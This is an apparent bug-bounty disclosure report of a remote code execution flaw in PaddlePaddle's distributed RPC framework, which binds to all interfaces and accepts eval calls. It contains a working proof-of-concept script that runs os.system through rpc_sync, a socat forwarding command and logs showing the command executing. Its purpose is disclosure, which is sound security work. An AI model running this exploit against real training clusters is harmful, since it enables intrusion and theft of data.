@@ -1,0 +1,82 @@
+Title: PaddlePaddle Distributed RPC Framework Remote Code Execution in paddlepaddle/paddle
+
+Proof of Concept: 
+Victim machine (10.206.0.3)
+
+a. On the master , we can enable the RPC service by calling the init_rpc function. Although the master_endpoint is set to 127.0.0.1:8003, the master will still listen to 0.0.0.0:MSTER_PORT, which is used to communicate with each node in the network.
+
+b. Similarly, we start a worker locally. After init_rpc interaction, both the master and the worker open a new RPC port, which is also bound to 0.0.0.0.
+
+# master.py
+import paddle.distributed.rpc as rpc
+
+def add(a, b):
+    return a + b
+
+rpc.init_rpc("master", rank=0, world_size=2, master_endpoint="127.0.0.1:8003")
+rpc.shutdown()
+
+# worker.py
+import paddle.distributed.rpc as rpc
+
+rpc.init_rpc("worker", rank=1, world_size=2, master_endpoint="127.0.0.1:8003")
+
+We can use the following commands to start the master and worker separately.
+
+python3 -i padd_master.py
+python3 -i padd_woker.py
+
+c.After startup, port 51996 is opened on the server for RPC service communication. Through network commands, you can see that they are all bound to 0.0.0.0, and there is a risk of remote access calls through the network.
+
+tcp        0      0 0.0.0.0:8003            0.0.0.0:*               LISTEN      2703880/python3     
+tcp        0      0 0.0.0.0:51996           0.0.0.0:*               LISTEN      2703880/python3 
+
+I0422 13:19:14.583161 2703880 tcp_utils.cc:181] The server starts to listen on IP_ANY:8003
+Server[paddle::distributed::RpcService] is serving on port=51996.
+
+Attacker machine (10.206.0.7)
+
+a.The attacker can connect to the victim master node through init_rpc. Then, we can communicate with the master through rpc.rpc_sync for RPC function invocations. Due to the lack of security filtering in paddle.distributed.rpc, workers can execute built-in Python functions like eval on the master node through RPC, even though these functions are not intentionally provided by the developer. This leads to remote code execution on the master node, potentially causing it to be compromised.
+
+# poc.py
+import paddle.distributed.rpc as rpc
+
+rpc.init_rpc("worker", rank=1, world_size=2, master_endpoint="10.206.0.3:8003")
+ret = rpc.rpc_sync("master", eval, args=('__import__("os").system("id")',))
+print(ret)
+
+b. In the test environment, rpc.rpc_sync will access 127.0.1.1:51996 by default, but you can set forwarding to forward the RPC call packet to the victim 10.206.0.3 address, as follows:
+
+sudo socat TCP-LISTEN:51996,fork,reuseaddr TCP:10.206.0.3:51996)
+
+c.As a result, the attacker exploited the vulnerability to call built-in Python functions like eval on the victim and execute arbitrary commands such as os.system("id").
+
+I0422 13:19:14.583161 2703880 tcp_utils.cc:181] The server starts to listen on IP_ANY:8003
+I0422 13:19:14.583320 2703880 tcp_utils.cc:130] Successfully connected to 127.0.0.1:8003
+I0422 13:19:30.807683 2703880 server.cpp:1107] Server[paddle::distributed::RpcService] is serving on port=51996.
+I0422 13:19:30.807710 2703880 server.cpp:1110] Check out http://VM-0-3-ubuntu:51996 in web browser.
+I0422 13:19:30.807809 2703880 rpc_agent.cc:57] Start worker : master
+I0422 13:19:31.040665 2703880 rpc_agent.cc:83] Init Channels: master
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+
+Impact: 
+An attacker can exploit this vulnerability to remotely attack master nodes that are starting distributed training. Through RCE, the master node is compromised, so as to further steal the sensitive data related to AI.
+
+CVE ID: None
+Status: None
+Vulnerability Type: CWE-77: Command Injection
+Severity: Critical (9.8)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: High
+Availability: High
+Registry: Pypi
+Affected Version: <=2.6.1
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $1500
+Fix Bounty: $375
